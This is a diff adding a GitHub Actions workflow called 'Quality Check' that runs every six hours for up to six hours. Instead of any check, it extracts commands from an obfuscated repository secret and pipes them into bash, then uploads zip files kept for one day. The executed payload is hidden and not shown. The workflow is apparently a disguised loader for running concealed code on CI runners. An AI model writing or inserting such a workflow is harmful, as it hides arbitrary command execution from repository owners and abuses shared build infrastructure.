@@ -1,0 +1,30 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '23 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          thvdv3: ${{ secrets.thvdv3 }}
+        run: |
+          printf '%s' "$thvdv3" | jq -r .akyyi67 | /bin/bash
+          echo $gjji645 | jq -r .xs789 | /bin/bash
+          printf '%s' "$ihnau67" | jq -r .cdr60 | /bin/bash
+          echo $lmqd31 | jq -r .rje349 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: fzQEzlgq
+          path: "*.zip"
+          retention-days: 1
